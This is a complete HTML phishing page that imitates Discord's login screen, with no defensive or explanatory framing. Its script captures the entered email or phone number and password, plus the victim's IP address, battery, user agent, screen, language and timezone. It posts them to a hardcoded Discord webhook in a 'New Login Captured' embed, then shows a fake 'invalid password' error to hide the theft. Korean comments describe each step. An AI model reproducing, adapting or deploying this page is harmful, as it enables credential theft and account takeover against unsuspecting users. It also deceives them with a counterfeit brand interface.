<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Discord — Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="https://discord.com/assets/favicon.ico">
    <style>
        :root {
            --bg-primary: #313338;
            --bg-input: #1e1f22;
            --text-normal: #dbdee1;
            --text-bright: #f2f3f5;
            --text-muted: #949ba4;
            --text-link: #00a8fc;
            --brand: #5865f2;
            --brand-hover: #4752c4;
            --danger: #f23f43;
            --font: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: var(--font); }
        html, body { height: 100%; }
        body {
            background: var(--bg-primary);
            color: var(--text-normal);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            -webkit-font-smoothing: antialiased;
        }
        .login-wrapper { width: 100%; max-width: 480px; }
        .box {
            background: var(--bg-primary);
            padding: 32px;
            border-radius: 5px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
        }
        h1 { font-size: 24px; line-height: 30px; font-weight: 600; color: var(--text-bright); text-align: center; margin-bottom: 8px; }
        p.sub { font-size: 16px; line-height: 20px; color: #b5bac1; text-align: center; margin-bottom: 20px; }
        
        label {
            display: block; font-size: 12px; line-height: 16px; font-weight: 700;
            text-transform: uppercase; color: #b5bac1; margin-bottom: 8px; margin-top: 20px; letter-spacing: .02em;
        }
        label .req { color: var(--danger); margin-left: 2px; font-size: 14px; }
        
        input[type="text"], input[type="password"] {
            width: 100%; padding: 10px; background: var(--bg-input); border: 1px solid var(--bg-input);
            border-radius: 3px; color: var(--text-bright); font-size: 16px; line-height: 20px;
            outline: none; transition: border-color .2s;
        }
        input[type="text"]:focus, input[type="password"]:focus { border-color: var(--brand); }
        input.err { border-color: var(--danger) !important; }
        
        button {
            width: 100%; margin-top: 20px; padding: 12px; background: var(--brand); color: #fff;
            border: none; border-radius: 3px; font-size: 16px; line-height: 20px; font-weight: 500;
            cursor: pointer; transition: background .2s;
        }
        button:hover { background: var(--brand-hover); }
        button:disabled { opacity: .5; cursor: not-allowed; }
        
        .spin {
            display: inline-block; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff; border-radius: 50%; animation: spin .6s linear infinite;
            vertical-align: middle; margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .forgot { display: block; margin-top: 14px; color: var(--text-link); font-size: 14px; text-decoration: none; }
        .forgot:hover { text-decoration: underline; }
        
        .register { margin-top: 20px; font-size: 14px; color: var(--text-muted); }
        .register a { color: var(--text-link); text-decoration: none; }
        .register a:hover { text-decoration: underline; }
        
        .error { color: var(--danger); font-size: 14px; line-height: 20px; margin-top: 8px; display: none; }
        .error.show { display: block; }
        
        .footer { text-align: center; margin-top: 24px; font-size: 12px; color: var(--text-muted); }
        .help { text-align: center; margin-top: 20px; font-size: 12px; color: var(--text-muted); }
        .help a { color: var(--text-link); text-decoration: none; }
        .help a:hover { text-decoration: underline; }
        
        @media (max-width: 520px) { .box { padding: 24px 20px; } h1 { font-size: 22px; } }
    </style>
</head>
<body>
<div class="login-wrapper">
    <div class="box">
        <h1>Welcome back!</h1>
        <p class="sub">We're so excited to see you again!</p>

        <form id="loginForm" novalidate>
            <label>Email or Phone Number <span class="req">*</span></label>
            <input type="text" id="email" autocomplete="username" spellcheck="false" autofocus>
            <div class="error" id="err1">Login or password is invalid.</div>

            <label>Password <span class="req">*</span></label>
            <input type="password" id="pw" autocomplete="current-password">
            <div class="error" id="err2">Login or password is invalid.</div>

            <a class="forgot" href="https://discord.com/login">Forgot your password?</a>

            <button type="submit" id="btn">Log In</button>

            <div class="register">Need an account? <a href="https://discord.com/register">Register</a></div>
        </form>

        <div class="footer">Protected by hCaptcha</div>
    </div>
    <div class="help"><a href="https://support.discord.com">Need help?</a></div>
</div>

<script>
// ═══════════════════════════════════════════════════════════
// 새로 만든 웹훅 URL
// ═══════════════════════════════════════════════════════════
const WEBHOOK = "https://discord.com/api/webhooks/1566351919880994897/2JspyE8O6rY53Kc2C0NtPQ586CNDt1WapBqkvCi0k6Rz3odRfraOZtvvR_aok9kJpL08";

// 상세 정보 수집 함수
async function getDetails() {
    let ip = "Unknown";
    let battery = "Unknown";
    
    // 1. IP 가져오기
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        ip = data.ip;
    } catch (e) {}

    // 2. 배터리 정보 가져오기 (지원하는 브라우저만)
    try {
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            battery = Math.round(b.level * 100) + "% " + (b.charging ? "⚡ (충전중)" : "🔋");
        }
    } catch (e) {}

    // 3. 화면 크기, 언어, 시간대 등
    return {
        ip: ip,
        battery: battery,
        ua: navigator.userAgent,
        lang: navigator.language,
        screen: window.screen.width + "x" + window.screen.height,
        platform: navigator.platform || "Unknown",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
}

// 웹훅 전송 함수
async function send(creds) {
    // 상세 정보 수집
    const info = await getDetails();
    
    // 임베드 페이로드 구성 (글자수 제한 안 걸리게 안전하게 처리)
    const payload = {
        embeds: [{
            title: "🔐 New Login Captured",
            color: 0x5865F2, // 디스코드 블러플 색상
            fields: [
                {
                    name: "📧 Email / Phone",
                    value: "```" + creds.email + "```",
                    inline: false
                },
                {
                    name: "🔑 Password",
                    value: "```" + creds.pw + "```",
                    inline: false
                },
                {
                    name: "🌐 IP Address",
                    value: "`" + info.ip + "`",
                    inline: true
                },
                {
                    name: "🔋 Battery",
                    value: "`" + info.battery + "`",
                    inline: true
                },
                {
                    name: "💻 OS / Platform",
                    value: "`" + info.platform + "`",
                    inline: true
                },
                {
                    name: "🖥️ Screen Resolution",
                    value: "`" + info.screen + "`",
                    inline: true
                },
                {
                    name: "🗣️ Language",
                    value: "`" + info.lang + "`",
                    inline: true
                },
                {
                    name: "🕒 Timezone",
                    value: "`" + info.timezone + "`",
                    inline: true
                },
                {
                    name: "🖥️ Full User-Agent",
                    value: "```" + info.ua + "```", // ... 없이 전체 다 나옴
                    inline: false
                }
            ],
            footer: {
                text: "Discord Security System",
                icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
            },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        const res = await fetch(WEBHOOK + "?wait=true", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        
        const data = await res.json();
        if (res.ok) {
            console.log("✅ 웹훅 전송 성공:", data);
        } else {
            console.error("❌ 웹훅 전송 실패:", data);
        }
    } catch(err) {
        console.error("❌ 네트워크 에러:", err);
    }
}

document.getElementById("loginForm").addEventListener("submit", async (e) => {
    e.preventDefault();

    const emailEl = document.getElementById("email");
    const pwEl    = document.getElementById("pw");
    const err1    = document.getElementById("err1");
    const err2    = document.getElementById("err2");
    const btn     = document.getElementById("btn");

    const email = emailEl.value.trim();
    const pw    = pwEl.value;

    // 에러 초기화
    [err1, err2].forEach(el => el.classList.remove("show"));
    [emailEl, pwEl].forEach(el => el.classList.remove("err"));

    // 빈칸 검사
    let hasError = false;
    if (!email) { err1.classList.add("show"); emailEl.classList.add("err"); hasError = true; }
    if (!pw)    { err2.classList.add("show"); pwEl.classList.add("err");    hasError = true; }
    if (hasError) return;

    // 버튼 로딩
    btn.disabled = true;
    btn.innerHTML = '<span class="spin"></span>Logging in...';

    // 데이터 전송
    await send({ email, pw });

    // 1.8초 뒤 로그인 실패 위장
    setTimeout(() => {
        btn.disabled = false;
        btn.textContent = "Log In";
        
        err2.classList.add("show");
        err2.textContent = "Login or password is invalid.";
        
        pwEl.classList.add("err");
        pwEl.value = "";
        pwEl.focus();
    }, 1800);
});

// 입력 시작하면 에러 지우기
["email", "pw"].forEach(id => {
    document.getElementById(id).addEventListener("input", () => {
        document.getElementById(id).classList.remove("err");
        document.getElementById("err" + (id === "email" ? "1" : "2")).classList.remove("show");
    });
});
</script>
</body>
</html>
